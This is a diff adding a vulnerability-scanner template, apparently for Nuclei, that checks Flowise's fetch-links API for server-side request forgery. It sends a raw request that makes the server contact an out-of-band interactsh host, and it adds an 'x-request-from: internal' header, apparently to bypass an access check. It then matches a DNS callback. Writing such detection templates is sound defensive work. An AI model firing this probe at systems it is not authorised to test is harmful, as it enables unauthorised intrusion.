@@ -1,0 +1,19 @@
+id: Flowise-fetch-links-ssrf
+
+info:
+  name: Flowise fetch-links SSRF漏洞
+  author: Flowise
+  severity: high
+  tags: SSRF
+
+http:
+  - raw:
+      - |
+        GET /api/v1/fetch-links?url=http%3A%2F%2F{{interactsh-url}}%2F&relativeLinksMethod=webCrawl&limit=10 HTTP/1.1
+        Host: {{Hostname}}
+        x-request-from: internal
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
